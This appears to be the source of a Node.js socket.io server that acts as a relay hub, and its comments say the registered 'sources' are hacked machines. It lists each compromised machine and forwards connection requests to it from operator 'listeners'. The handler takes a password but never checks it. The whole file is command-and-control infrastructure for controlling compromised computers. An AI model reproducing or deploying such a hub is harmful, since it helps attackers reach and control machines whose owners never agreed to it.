require('dotenv').config()
const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server);
const PORT = process.env.PORT || 3000;

app.use(express.static("public"));

// List of Sources
const socketList = [];

// Sources are the hacked machines
// Listeners are the clients
io.on('connection', function (socket) {
    let socketID = null;
    let connectedSource = null;
    let socketRoom = null;
    function updatedSocketList() {
        io.emit("socketList", socketList);
    }

    socket.on("joinRoom", (role, name, password) => {
        if (!role || !name || name.includes("-")) {
            console.log("Failed Connection");
            return;
        }
        socketID = socket.id + "-" + name;
        if (role === "source") {
            socketRoom = role;
            console.log(`Socket ${socketID} joined as a source.`);
            socketList.push(socketID);
        } else if (role === "listener") {
            socketRoom = role;
            console.log(`Socket ${socketID} joined as a listener.`);
        } else {
            console.log("Improper Role");
            return;
        }
        updatedSocketList();
    });

    socket.on("disconnect", () => {
        console.log(`User disconnected: ${socketID}`);
        if (socketRoom != "source") {
            return;
        }
        let index = socketList.indexOf(socketID);
        if (index == -1) {
            console.log("Source doesn't exist, disconnect.");
            return;
        }
        socketList.splice(index, 1);
        updatedSocketList();
    });

    socket.on("connectToServer", (id) => {
        if(!id || id.length == 0) {
            return; // Invalid ID and/or Password
        }
        let serv = null;
        for(let i = 0; i < socketList.length; i++) {
            if(socketList[i] == id) {
                serv = socketList[i];
                break;
            }
        }
        if(serv == null) {
            return; // Invalid ID
        }
        console.log(`Attempt connection to ${serv}`);
        serv = serv.substring(0, serv.indexOf("-"));
        io.to(serv).emit("connectionRequest", socket.id);
    });
});

server.listen(PORT, () => {
    console.log(`Listening on: http://localhost:${PORT}`);
});